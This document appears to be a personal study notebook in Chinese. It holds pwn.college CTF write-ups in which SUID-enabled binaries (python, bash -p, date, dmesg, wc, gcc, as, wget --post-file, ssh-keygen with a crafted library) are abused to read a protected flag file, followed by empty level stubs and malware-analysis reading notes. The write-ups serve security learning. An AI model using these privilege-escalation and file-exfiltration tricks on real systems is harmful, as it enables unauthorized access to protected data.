I just set the SUID bit on /usr/bin/python.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level42) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/python!
</code></pre>
<p>使用python</p>
<pre><code>&gt;&gt;&gt; with open(&quot;/flag&quot;,&quot;r&quot;) as f:
...     print(f.read())
...
pwn.college{kTtv9lYtW7yK8dnUSvApk5Yv1s-.0FN4EDL2QjMyMzW}

&gt;&gt;&gt;
</code></pre>
<h2 id="level43-lets-you-read-the-flag-because-they-let-you-program-anything"><a class="header" href="#level43-lets-you-read-the-flag-because-they-let-you-program-anything">level43 Lets you read the flag because they let you program anything!</a></h2>
<pre><code>hacker@program-misuse-level-43:~$ sh file.sh
Welcome to ./babysuid_level43!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/ruby.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level43) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ruby!
</code></pre>
<p>用ruby写脚本</p>
<pre><code># 打开文件
File.open('/flag', 'r') do |f|
  # 读取文件内容
  content = f.read
  # 输出文件内容
  puts content
end
</code></pre>
<pre><code>hacker@program-misuse-level-43:~$ ruby level43.rb
pwn.college{smGb0PfTvxp0__6HgKHsucNW2Pg.0VN4EDL2QjMyMzW}
hacker@program-misuse-level-43:~$
</code></pre>
<h2 id="level44-lets-you-read-the-flag-because-they-let-you-program-anything"><a class="header" href="#level44-lets-you-read-the-flag-because-they-let-you-program-anything">level44 Lets you read the flag because they let you program anything!</a></h2>
<pre><code>hacker@program-misuse-level-44:~$ sh file.sh
Welcome to ./babysuid_level44!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/bash.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level44) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/bash!
</code></pre>
<p>bash，参照之前的题拿到提示符</p>
<pre><code>hacker@program-misuse-level-44:~$ bash -p
bash-5.0# cat /flag
pwn.college{wsQ6idwZWBnJ7doJInQhvY0hBVg.0lN4EDL2QjMyMzW}
bash-5.0#
</code></pre>
<h2 id="level45-just-straight-up-wasnt-designed-to-let-you-read-files"><a class="header" href="#level45-just-straight-up-wasnt-designed-to-let-you-read-files">level45 Just straight up wasn’t designed to let you read files!</a></h2>
<pre><code>hacker@program-misuse-level-45:~$ sh file.sh
Welcome to ./babysuid_level45!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/date.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level45) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/date!
</code></pre>
<p>手册里写了-f读文件</p>
<pre><code>hacker@program-misuse-level-45:~$ date -f /flag
date: invalid date 'pwn.college{E0wTS_9vWAv5Z6QWVWGpaHKER5P.01N4EDL2QjMyMzW}'
hacker@program-misuse-level-45:~$
</code></pre>
<h2 id="level46-just-straight-up-wasnt-designed-to-let-you-read-files"><a class="header" href="#level46-just-straight-up-wasnt-designed-to-let-you-read-files">level46 Just straight up wasn’t designed to let you read files!</a></h2>
<pre><code>hacker@program-misuse-level-46:~$ sh file.sh
Welcome to ./babysuid_level46!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/dmesg.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level46) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/dmesg!
</code></pre>
<p>显示开机时间之类的东西</p>
<pre><code>hacker@program-misuse-level-46:~$ dmesg -F /flag
[    0.000000] pwn.college{Q8U4rT5_srr0BlLq1ZlDOJx0yDe.0FO4EDL2QjMyMzW}
hacker@program-misuse-level-46:~$
</code></pre>
<p>都是看手册</p>
<h2 id="level47-just-straight-up-wasnt-designed-to-let-you-read-files"><a class="header" href="#level47-just-straight-up-wasnt-designed-to-let-you-read-files">level47 Just straight up wasn’t designed to let you read files!</a></h2>
<pre><code>hacker@program-misuse-level-47:~$ sh file.sh
Welcome to ./babysuid_level47!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/wc.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level47) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/wc!
</code></pre>
<p><code>wc</code>一般用于统计行号、字数什么的。</p>
<pre><code>hacker@program-misuse-level-47:~$ wc --files0-from=/flag
wc: 'pwn.college{shy1dFSZ2LmpPnQ-OAl_RoDeLxh.0VO4EDL2QjMyMzW}'$'\n': No such file or directory
hacker@program-misuse-level-47:~$
</code></pre>
<p>从手册来看就上面这个不是统计数量的，因此就它了！</p>
<h2 id="level48-just-straight-up-wasnt-designed-to-let-you-read-files"><a class="header" href="#level48-just-straight-up-wasnt-designed-to-let-you-read-files">level48 Just straight up wasn’t designed to let you read files!</a></h2>
<pre><code>hacker@program-misuse-level-48:~$ sh file.sh
Welcome to ./babysuid_level48!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/gcc.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level48) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/gcc!
</code></pre>
<p>有点儿意思，gcc都出来了</p>
<pre><code>hacker@program-misuse-level-48:~$ gcc -x c -E /flag
# 1 &quot;/flag&quot;
# 1 &quot;&lt;built-in&gt;&quot;
# 1 &quot;&lt;command-line&gt;&quot;
# 31 &quot;&lt;command-line&gt;&quot;
# 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4
# 32 &quot;&lt;command-line&gt;&quot; 2
# 1 &quot;/flag&quot;
pwn.college{UgtHTJRU8raItcJF89PS-hM7Rh9.0FM5EDL2QjMyMzW}
hacker@program-misuse-level-48:~$
</code></pre>
<p>它这个必须要指定语言，不然不能运行</p>
<p>///@TODO:
这个一定要去看官方解答，直接在一个程序里面include ‘/flag’，然后靠报错得到flag，非常有启发</p>
<h2 id="level49-just-straight-up-wasnt-designed-to-let-you-read-files"><a class="header" href="#level49-just-straight-up-wasnt-designed-to-let-you-read-files">level49 Just straight up wasn’t designed to let you read files!</a></h2>
<pre><code>hacker@program-misuse-level-49:~$ sh file.sh
Welcome to ./babysuid_level49!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/as.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level49) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/as!
</code></pre>
<p><code>as</code>:汇编语言的编译器</p>
<pre><code>hacker@program-misuse-level-49:~$ as -g /flag
/flag: Assembler messages:
/flag:1: Error: no such instruction: `pwn.college{MqHCh7Oprd3rEP2f1i_RgAl8QZR.0VM5EDL2QjMyMzW}'
hacker@program-misuse-level-49:~$
</code></pre>
<p>通过调试输出</p>
<h2 id="level50-just-straight-up-wasnt-designed-to-let-you-read-files"><a class="header" href="#level50-just-straight-up-wasnt-designed-to-let-you-read-files">level50 Just straight up wasn’t designed to let you read files!</a></h2>
<pre><code>hacker@program-misuse-level-50:~$ sh file.sh
Welcome to ./babysuid_level50!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/wget.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level50) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/wget!
</code></pre>
<p><code>wget</code>:下载器</p>
<pre><code>hacker@program-misuse-level-50:~$ nc -lp 8888 &amp; wget --post-file=/flag http://127.0.0.1:8888
[1] 5873
--2023-07-22 13:39:17--  http://127.0.0.1:8888/
Connecting to 127.0.0.1:8888... connected.
POST / HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 127.0.0.1:8888
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

HTTP request sent, awaiting response... pwn.college{M8oJZxXsT1hCl5_WCWqpA-ITlJZ.0lM5EDL2QjMyMzW}

</code></pre>
<p>有个叫文件上传的功能，这个看了一个别人的答案</p>
<h2 id="level51-shows-how-dangerous-it-is-to-allow-users-to-load-their-own-code-as-plugins-into-the-program-but-figuring-out-how-is-the-hard-part"><a class="header" href="#level51-shows-how-dangerous-it-is-to-allow-users-to-load-their-own-code-as-plugins-into-the-program-but-figuring-out-how-is-the-hard-part">level51 Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)!</a></h2>
<pre><code>hacker@program-misuse-level-51:~$ sh file.sh
Welcome to ./babysuid_level51!

This challenge is part of a series of programs that
show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).

I just set the SUID bit on /usr/bin/ssh-keygen.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level51) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ssh-keygen!
</code></pre>
<p>这个我是一点儿都不会，看了一下讲解才明白，G</p>
<p>这个就是写一个C/C++程序，里面要有C_GetFunctionList这个函数，然后用sendfile来open文件。</p>
<p>然后使用gcc编译成.so文件，最后使用ssh-keygen -D即可。</p>
<pre><code>hacker@program-misuse-level-51:~$ ssh-keygen -D ./level51.so
pwn.college{koI1pFWalnNHyjlN_NQ4CLcsasT.01M5EDL2QjMyMzW}
C_GetFunctionList for provider ./level51.so failed: 57
cannot read public key from pkcs11
hacker@program-misuse-level-51:~$
</code></pre>
<h2 id="值得记录的内容"><a class="header" href="#值得记录的内容">值得记录的内容</a></h2>
<p>关于mv 那块儿的，<a href="https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619">一个博客</a></p>
<p>最后一个题的<a href="https://www.youtube.com/watch?v=14mIjpOXnrM&amp;t=2878s">讲解</a>,这玩意儿不讲是真不会，太菜了</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="knowledge-2"><a class="header" href="#knowledge-2">Knowledge</a></h1>
<h1 id="wp-2"><a class="header" href="#wp-2">wp</a></h1>
<h2 id="level1-2"><a class="header" href="#level1-2">level1</a></h2>
<pre><code>hacker@program-interaction-level-1:~$ /challenge/embryoio_level1
WELCOME! This challenge makes the following asks of you:
- the challenge checks for a specific parent process : bash

ONWARDS TO GREATNESS!

[INFO] This challenge will now perform a bunch of checks.
[INFO] If you pass these checks, you will receive the flag.
[TEST] Performing checks on the parent process of this process.
[TEST] Checking to make sure the process is the bash shell. If this is a check for the parent process, then,
[TEST] most likely, this is what you do by default anyways, but we'll check just in case...
[INFO] The process' executable is /usr/bin/bash.
[INFO] This might be different than expected because of symbolic links (for example, from /usr/bin/python to /usr/bin/python3 to /usr/bin/python3.8).
[INFO] To pass the checks, the executable must be bash.
[FAIL] You did not satisfy all the execution requirements.
[FAIL] Specifically, you must fix the following issue:
[FAIL]    The shell process must be running in its default, interactive mode (/bin/bash with no commandline arguments). Your commandline arguments are: ['/bin/bash', '--init-file', '/usr/lib/code-server/lib/vscode/out/vs/workbench/contrib/terminal/browser/media/shellIntegration-bash.sh']
hacker@program-interaction-level-1:~$
</code></pre>
<h2 id="level2-2"><a class="header" href="#level2-2">level2</a></h2>
<pre><code>
</code></pre>
<h2 id="level3-1"><a class="header" href="#level3-1">level3</a></h2>
<pre><code>
</code></pre>
<h2 id="level4-1"><a class="header" href="#level4-1">level4</a></h2>
<pre><code>
</code></pre>
<h2 id="level5-1"><a class="header" href="#level5-1">level5</a></h2>
<pre><code>
</code></pre>
<h2 id="level6-1"><a class="header" href="#level6-1">level6</a></h2>
<pre><code>
</code></pre>
<h2 id="level7-1"><a class="header" href="#level7-1">level7</a></h2>
<pre><code>
</code></pre>
<h2 id="level8-1"><a class="header" href="#level8-1">level8</a></h2>
<pre><code>
</code></pre>
<h2 id="level9-1"><a class="header" href="#level9-1">level9</a></h2>
<pre><code>
</code></pre>
<h2 id="level10-1"><a class="header" href="#level10-1">level10</a></h2>
<pre><code>
</code></pre>
<h2 id="level11-1"><a class="header" href="#level11-1">level11</a></h2>
<pre><code>
</code></pre>
<h2 id="level12-1"><a class="header" href="#level12-1">level12</a></h2>
<pre><code>
</code></pre>
<h2 id="level13-1"><a class="header" href="#level13-1">level13</a></h2>
<pre><code>
</code></pre>
<h2 id="level14-1"><a class="header" href="#level14-1">level14</a></h2>
<pre><code>
</code></pre>
<h2 id="level15-1"><a class="header" href="#level15-1">level15</a></h2>
<pre><code>
</code></pre>
<h2 id="level16-1"><a class="header" href="#level16-1">level16</a></h2>
<pre><code>
</code></pre>
<h2 id="level17-1"><a class="header" href="#level17-1">level17</a></h2>
<pre><code>
</code></pre>
<h2 id="level18-1"><a class="header" href="#level18-1">level18</a></h2>
<pre><code>
</code></pre>
<h2 id="level19-1"><a class="header" href="#level19-1">level19</a></h2>
<pre><code>
</code></pre>
<h2 id="level20-1"><a class="header" href="#level20-1">level20</a></h2>
<pre><code>
</code></pre>
<h2 id="level21-1"><a class="header" href="#level21-1">level21</a></h2>
<pre><code>
</code></pre>
<h2 id="level22-1"><a class="header" href="#level22-1">level22</a></h2>
<pre><code>
</code></pre>
<h2 id="level23-1"><a class="header" href="#level23-1">level23</a></h2>
<pre><code>
</code></pre>
<h2 id="level24-1"><a class="header" href="#level24-1">level24</a></h2>
<pre><code>
</code></pre>
<h2 id="level25-1"><a class="header" href="#level25-1">level25</a></h2>
<pre><code>
</code></pre>
<h2 id="level26-1"><a class="header" href="#level26-1">level26</a></h2>
<pre><code>
</code></pre>
<h2 id="level27-1"><a class="header" href="#level27-1">level27</a></h2>
<pre><code>
</code></pre>
<h2 id="level28-1"><a class="header" href="#level28-1">level28</a></h2>
<pre><code>
</code></pre>
<h2 id="level29-1"><a class="header" href="#level29-1">level29</a></h2>
<pre><code>
</code></pre>
<h2 id="level30-1"><a class="header" href="#level30-1">level30</a></h2>
<pre><code>
</code></pre>
<h2 id="level31-1"><a class="header" href="#level31-1">level31</a></h2>
<pre><code>
</code></pre>
<h2 id="level32-1"><a class="header" href="#level32-1">level32</a></h2>
<pre><code>
</code></pre>
<h2 id="level33-1"><a class="header" href="#level33-1">level33</a></h2>
<pre><code>
</code></pre>
<h2 id="level34-1"><a class="header" href="#level34-1">level34</a></h2>
<pre><code>
</code></pre>
<h2 id="level35-1"><a class="header" href="#level35-1">level35</a></h2>
<pre><code>
</code></pre>
<h2 id="level36-1"><a class="header" href="#level36-1">level36</a></h2>
<pre><code>
</code></pre>
<h2 id="level37-1"><a class="header" href="#level37-1">level37</a></h2>
<pre><code>
</code></pre>
<h2 id="level38-1"><a class="header" href="#level38-1">level38</a></h2>
<pre><code>
</code></pre>
<h2 id="level39-1"><a class="header" href="#level39-1">level39</a></h2>
<pre><code>
</code></pre>
<h2 id="level40"><a class="header" href="#level40">level40</a></h2>
<pre><code>
</code></pre>
<h2 id="level41"><a class="header" href="#level41">level41</a></h2>
<pre><code>
</code></pre>
<h2 id="level42"><a class="header" href="#level42">level42</a></h2>
<pre><code>
</code></pre>
<h2 id="level43"><a class="header" href="#level43">level43</a></h2>
<pre><code>
</code></pre>
<h2 id="level44"><a class="header" href="#level44">level44</a></h2>
<pre><code>
</code></pre>
<h2 id="level45"><a class="header" href="#level45">level45</a></h2>
<pre><code>
</code></pre>
<h2 id="level46"><a class="header" href="#level46">level46</a></h2>
<pre><code>
</code></pre>
<h2 id="level47"><a class="header" href="#level47">level47</a></h2>
<pre><code>
</code></pre>
<h2 id="level48"><a class="header" href="#level48">level48</a></h2>
<pre><code>
</code></pre>
<h2 id="level49"><a class="header" href="#level49">level49</a></h2>
<pre><code>
</code></pre>
<h2 id="level50"><a class="header" href="#level50">level50</a></h2>
<pre><code>
</code></pre>
<h2 id="level51"><a class="header" href="#level51">level51</a></h2>
<pre><code>
</code></pre>
<h2 id="level52"><a class="header" href="#level52">level52</a></h2>
<pre><code>
</code></pre>
<h2 id="level53"><a class="header" href="#level53">level53</a></h2>
<pre><code>
</code></pre>
<h2 id="level54"><a class="header" href="#level54">level54</a></h2>
<pre><code>
</code></pre>
<h2 id="level55"><a class="header" href="#level55">level55</a></h2>
<pre><code>
</code></pre>
<h2 id="level56"><a class="header" href="#level56">level56</a></h2>
<pre><code>
</code></pre>
<h2 id="level57"><a class="header" href="#level57">level57</a></h2>
<pre><code>
</code></pre>
<h2 id="level58"><a class="header" href="#level58">level58</a></h2>
<pre><code>
</code></pre>
<h2 id="level59"><a class="header" href="#level59">level59</a></h2>
<pre><code>
</code></pre>
<h2 id="level60"><a class="header" href="#level60">level60</a></h2>
<pre><code>
</code></pre>
<h2 id="level61"><a class="header" href="#level61">level61</a></h2>
<pre><code>
</code></pre>
<h2 id="level62"><a class="header" href="#level62">level62</a></h2>
<pre><code>
</code></pre>
<h2 id="level63"><a class="header" href="#level63">level63</a></h2>
<pre><code>
</code></pre>
<h2 id="level64"><a class="header" href="#level64">level64</a></h2>
<pre><code>
</code></pre>
<h2 id="level65"><a class="header" href="#level65">level65</a></h2>
<pre><code>
</code></pre>
<h2 id="level66"><a class="header" href="#level66">level66</a></h2>
<pre><code>
</code></pre>
<h2 id="level67"><a class="header" href="#level67">level67</a></h2>
<pre><code>
</code></pre>
<h2 id="level68"><a class="header" href="#level68">level68</a></h2>
<pre><code>
</code></pre>
<h2 id="level70"><a class="header" href="#level70">level70</a></h2>
<pre><code>
</code></pre>
<h2 id="level71"><a class="header" href="#level71">level71</a></h2>
<pre><code>
</code></pre>
<h2 id="level72"><a class="header" href="#level72">level72</a></h2>
<pre><code>
</code></pre>
<h2 id="level73"><a class="header" href="#level73">level73</a></h2>
<pre><code>
</code></pre>
<h2 id="level74"><a class="header" href="#level74">level74</a></h2>
<pre><code>
</code></pre>
<h2 id="level76"><a class="header" href="#level76">level76</a></h2>
<pre><code>
</code></pre>
<h2 id="level77"><a class="header" href="#level77">level77</a></h2>
<pre><code>
</code></pre>
<h2 id="level78"><a class="header" href="#level78">level78</a></h2>
<pre><code>
</code></pre>
<h2 id="level79"><a class="header" href="#level79">level79</a></h2>
<pre><code>
</code></pre>
<h2 id="level80"><a class="header" href="#level80">level80</a></h2>
<pre><code>
</code></pre>
<h2 id="level82"><a class="header" href="#level82">level82</a></h2>
<pre><code>
</code></pre>
<h2 id="level83"><a class="header" href="#level83">level83</a></h2>
<pre><code>
</code></pre>
<h2 id="level84"><a class="header" href="#level84">level84</a></h2>
<pre><code>
</code></pre>
<h2 id="level85"><a class="header" href="#level85">level85</a></h2>
<pre><code>
</code></pre>
<h2 id="level86"><a class="header" href="#level86">level86</a></h2>
<pre><code>
</code></pre>
<h2 id="level87"><a class="header" href="#level87">level87</a></h2>
<pre><code>
</code></pre>
<h2 id="level88"><a class="header" href="#level88">level88</a></h2>
<pre><code>
</code></pre>
<h2 id="level89"><a class="header" href="#level89">level89</a></h2>
<pre><code>
</code></pre>
<h2 id="level90"><a class="header" href="#level90">level90</a></h2>
<pre><code>
</code></pre>
<h2 id="level91"><a class="header" href="#level91">level91</a></h2>
<pre><code>
</code></pre>
<h2 id="level92"><a class="header" href="#level92">level92</a></h2>
<pre><code>
</code></pre>
<h2 id="level93"><a class="header" href="#level93">level93</a></h2>
<pre><code>
</code></pre>
<h2 id="level94"><a class="header" href="#level94">level94</a></h2>
<pre><code>
</code></pre>
<h2 id="level95"><a class="header" href="#level95">level95</a></h2>
<pre><code>
</code></pre>
<h2 id="level96"><a class="header" href="#level96">level96</a></h2>
<pre><code>
</code></pre>
<h2 id="level97"><a class="header" href="#level97">level97</a></h2>
<pre><code>
</code></pre>
<h2 id="level98"><a class="header" href="#level98">level98</a></h2>
<pre><code>
</code></pre>
<h2 id="level99"><a class="header" href="#level99">level99</a></h2>
<pre><code>
</code></pre>
<h2 id="level100"><a class="header" href="#level100">level100</a></h2>
<pre><code>
</code></pre>
<h2 id="level101"><a class="header" href="#level101">level101</a></h2>
<pre><code>
</code></pre>
<h2 id="level102"><a class="header" href="#level102">level102</a></h2>
<pre><code>
</code></pre>
<h2 id="level103"><a class="header" href="#level103">level103</a></h2>
<pre><code>
</code></pre>
<h2 id="level104"><a class="header" href="#level104">level104</a></h2>
<pre><code>
</code></pre>
<h2 id="level105"><a class="header" href="#level105">level105</a></h2>
<pre><code>
</code></pre>
<h2 id="level106"><a class="header" href="#level106">level106</a></h2>
<pre><code>
</code></pre>
<h2 id="level107"><a class="header" href="#level107">level107</a></h2>
<pre><code>
</code></pre>
<h2 id="level108"><a class="header" href="#level108">level108</a></h2>
<pre><code>
</code></pre>
<h2 id="level109"><a class="header" href="#level109">level109</a></h2>
<pre><code>
</code></pre>
<h2 id="level110"><a class="header" href="#level110">level110</a></h2>
<pre><code>
</code></pre>
<h2 id="level111"><a class="header" href="#level111">level111</a></h2>
<pre><code>
</code></pre>
<h2 id="level112"><a class="header" href="#level112">level112</a></h2>
<pre><code>
</code></pre>
<h2 id="level113"><a class="header" href="#level113">level113</a></h2>
<pre><code>
</code></pre>
<h2 id="level114"><a class="header" href="#level114">level114</a></h2>
<pre><code>
</code></pre>
<h2 id="level115"><a class="header" href="#level115">level115</a></h2>
<pre><code>
</code></pre>
<h2 id="level116"><a class="header" href="#level116">level116</a></h2>
<pre><code>
</code></pre>
<h2 id="level117"><a class="header" href="#level117">level117</a></h2>
<pre><code>
</code></pre>
<h2 id="level118"><a class="header" href="#level118">level118</a></h2>
<pre><code>
</code></pre>
<h2 id="level119"><a class="header" href="#level119">level119</a></h2>
<pre><code>
</code></pre>
<h2 id="level120"><a class="header" href="#level120">level120</a></h2>
<pre><code>
</code></pre>
<h2 id="level121"><a class="header" href="#level121">level121</a></h2>
<pre><code>
</code></pre>
<h2 id="level122"><a class="header" href="#level122">level122</a></h2>
<pre><code>
</code></pre>
<h2 id="level123"><a class="header" href="#level123">level123</a></h2>
<pre><code>
</code></pre>
<h2 id="level124"><a class="header" href="#level124">level124</a></h2>
<pre><code>
</code></pre>
<h2 id="level125"><a class="header" href="#level125">level125</a></h2>
<pre><code>
</code></pre>
<h2 id="level126"><a class="header" href="#level126">level126</a></h2>
<pre><code>
</code></pre>
<h2 id="level127"><a class="header" href="#level127">level127</a></h2>
<pre><code>
</code></pre>
<h2 id="level128"><a class="header" href="#level128">level128</a></h2>
<pre><code>
</code></pre>
<h2 id="level129"><a class="header" href="#level129">level129</a></h2>
<pre><code>
</code></pre>
<h2 id="level130"><a class="header" href="#level130">level130</a></h2>
<pre><code>
</code></pre>
<h2 id="level131"><a class="header" href="#level131">level131</a></h2>
<pre><code>
</code></pre>
<h2 id="level132"><a class="header" href="#level132">level132</a></h2>
<pre><code>
</code></pre>
<h2 id="level133"><a class="header" href="#level133">level133</a></h2>
<pre><code>
</code></pre>
<h2 id="level134"><a class="header" href="#level134">level134</a></h2>
<pre><code>
</code></pre>
<h2 id="level135"><a class="header" href="#level135">level135</a></h2>
<pre><code>
</code></pre>
<h2 id="level136"><a class="header" href="#level136">level136</a></h2>
<pre><code>
</code></pre>
<h2 id="level137"><a class="header" href="#level137">level137</a></h2>
<pre><code>
</code></pre>
<h2 id="level138"><a class="header" href="#level138">level138</a></h2>
<pre><code>
</code></pre>
<h2 id="level139"><a class="header" href="#level139">level139</a></h2>
<pre><code>
</code></pre>
<h2 id="level140"><a class="header" href="#level140">level140</a></h2>
<pre><code>
</code></pre>
<h2 id="level141"><a class="header" href="#level141">level141</a></h2>
<pre><code>
</code></pre>
<h2 id="level142"><a class="header" href="#level142">level142</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="恶意代码分析实战阅读笔记"><a class="header" href="#恶意代码分析实战阅读笔记">《恶意代码分析实战》阅读笔记</a></h1>
<p>这本书在课上学过，可惜当时讲的太浅，因此现在重新开始学习这些内容，并希望可以在学习的过程之中使用这些内容自己编写一些简单的、小的病毒。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="about-knowledge"><a class="header" href="#about-knowledge">About Knowledge</a></h1>
<p>存放了所有理论知识和笔记。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="the-goals-of-malware-analysis"><a class="header" href="#the-goals-of-malware-analysis">The Goals of Malware Analysis</a></h1>
<ul>
<li>确定到底发生了什么</li>
<li>确保能够定位出所有受感染的主机和文件</li>
<li>解刨可疑文件</li>
<li>找出可用于检测的特征码</li>
<li>基于机器学习构建检测系统</li>
<li>如何检测并控制损害</li>
</ul>
<h1 id="signatures-特征码"><a class="header" href="#signatures-特征码">Signatures 特征码</a></h1>
<ul>
<li>
<p>Identify files or registry keys on a victim computer that indicate an infection</p>
</li>
<li>
<p>Focus on what the malware did to the system, not the malware itself</p>
</li>
<li>
<p>Different from antivirus signatures</p>
</li>
<li>
<p>又称为感染迹象，用于在受感染主机上检测出恶意代码。</p>
</li>
<li>
<p>经常是恶意代码所创建或修改的文件，或是对注册表的特定修改。</p>
</li>
<li>
<p>与反病毒软件所使用的病毒特征码不同
恶意代码的感染迹象关注的是恶意代码对系统做了什么
恶意代码的病毒特征码关注的是恶意代码本身的特性。
有时感染迹象更加有效，比如检测那些经常变化自身形态的多态性恶意代码，或者恶意代码已经将自身文件从硬盘中删除。</p>
</li>
<li>
<p>Network signatures 基于网络的特征码</p>
</li>
<li>
<p>Detect malware by analyzing network traffic</p>
</li>
<li>
<p>More effective when made using malware analysis</p>
</li>
<li>
<p>通过监测网络流量来检测恶意代码</p>
</li>
<li>
<p>在恶意代码分析帮助下提取的基于网络的特征码往往是更加有效的，有更高的检测率和更少的误报</p>
</li>
</ul>
<h1 id="两种方法"><a class="header" href="#两种方法">两种方法</a></h1>
<p>静态、动态</p>
<p>而这两种之中又分为基础技术和高级技术，高级技术就是指逆向、调试等内容。</p>
<h1 id="恶意代码的类型"><a class="header" href="#恶意代码的类型">恶意代码的类型</a></h1>
<ol>
<li>Backdoor后门</li>
</ol>
<ul>
<li>Allows attacker to control the system</li>
<li>恶意代码将自身安装到一台计算机来允许攻击者访问</li>
</ul>
<ol start="2">
<li>Botnet 僵尸网络</li>
</ol>
<ul>
<li>All infected computers receive instructions from the same Command-and-Control (C&amp;C) server</li>
<li>所有被同一个僵尸网络感染的计算机将会从一台控制命令服务器接收到相同的命令，允许攻击者访问系统</li>
</ul>
<ol start="3">
<li>Downloader 下载器</li>
</ol>
<ul>
<li>Malicious code that exists only to download other malicious code</li>
<li>Used when attacker first gains access</li>
<li>只是用来下载其他恶意代码的恶意代码</li>
<li>通常是在攻击者获得系统的访问时首先进行安装的</li>
</ul>
<ol start="4">
<li>Information-stealing malware 间谍软件</li>
</ol>
<ul>
<li>Sniffers, keyloggers, password hash grabbers</li>
<li>从受害计算机上收集信息并发送给攻击者</li>
<li>比如：嗅探器、密码哈希采集器、键盘记录器等。</li>
</ul>
<ol start="5">
<li>Launcher 启动器</li>
</ol>
<ul>
<li>Malicious program used to launch other malicious programs</li>
<li>Often uses nontraditional techniques to ensure stealth or greater access to a system</li>
<li>用来启动其他恶意程序的恶意代码</li>
<li>通常使用一些非传统的技术来启动其他恶意程序，以确保其隐蔽性，或者以更高权限访问系统。</li>
</ul>
<ol start="6">
<li>Rootkit内核套件</li>
</ol>
<ul>
<li>Malware that conceals the existence of other code</li>
<li>Usually paired with a backdoor</li>
<li>用来隐藏其他恶意代码的恶意代码</li>
<li>通常是与其他恶意代码（如后门）组合成工具套装，来允许为攻击者提供远程访问</li>
</ul>
<ol start="7">
<li>Scareware 恐吓软件（勒索软件？）</li>
</ol>
<ul>
<li>Frightens user into buying something</li>
<li>勒索用户购买某些东西的恶意代码</li>
<li>通常有一个用户界面，使得它看起来像是一个杀毒软件或其他安全程序。它会通知用户系统中存在恶意代码，而唯一除掉它们的方法只有购买他们的“软件”，而事实上，他们所卖软件的全部功能只不过是将勒索软件进行移除而己。</li>
</ul>
<ol start="8">
<li>Spam-sending malware 发送垃圾邮件的恶意代码</li>
</ol>
<ul>
<li>Attacker rents machine to spammers</li>
<li>通过为攻击者出售垃圾邮件发送服务而获得收益</li>
</ul>
<ol start="9">
<li>Worms or viruses 蠕虫或病毒</li>
</ol>
<ul>
<li>Malicious code that can copy itself and infect additional computers</li>
<li>可以复制自身并感染其他计算机的恶意代码</li>
</ul>
<ol start="10">
<li>Ransomware 勒索软件</li>
</ol>
<ul>
<li>encrypt victim’s data as hostage</li>
<li>ask for ransom to recover the data</li>
<li>将受害者的数据加密为人质</li>
<li>勒索财物后才恢复数据</li>
</ul>
<h4 id="mass-v-targeted-malware"><a class="header" href="#mass-v-targeted-malware">Mass v. Targeted Malware</a></h4>
<ul>
<li>Mass malware 大众性恶意代码</li>
<li>Intended to infect as many machines as possible</li>
<li>Most common type</li>
<li>设计为影响到尽可能多的机器</li>
<li>最为普遍</li>
</ul>
<h4 id="targeted-malware-针对性恶意代码"><a class="header" href="#targeted-malware-针对性恶意代码">Targeted malware 针对性恶意代码</a></h4>
<ul>
<li>APT(Advanced Persistent Threat)：高级持续性威胁，本质是针对性攻击</li>
<li>Tailored to a specific target</li>
<li>Very difficult to detect, prevent, and remove</li>
<li>Requires advanced analysis</li>
<li>Ex: Stuxnet</li>
<li>针对特定组织而研制的</li>
<li>很难检测，防止和移除</li>
<li>需要高级分析</li>
<li>震网病毒</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="静态分析技术基础"><a class="header" href="#静态分析技术基础">静态分析技术基础</a></h1>
<h2 id="反病毒引擎"><a class="header" href="#反病毒引擎">反病毒引擎</a></h2>
<p>可以用一些开源扫描引擎先扫一下病毒</p>
<h2 id="哈希值"><a class="header" href="#哈希值">哈希值</a></h2>
<p>恶意代码的唯一标识。如果对hash不熟悉，这里需要一些密码学的知识。</p>
<p>工具：<code>md5deep</code></p>
<h2 id="查找字符串"><a class="header" href="#查找字符串">查找字符串</a></h2>
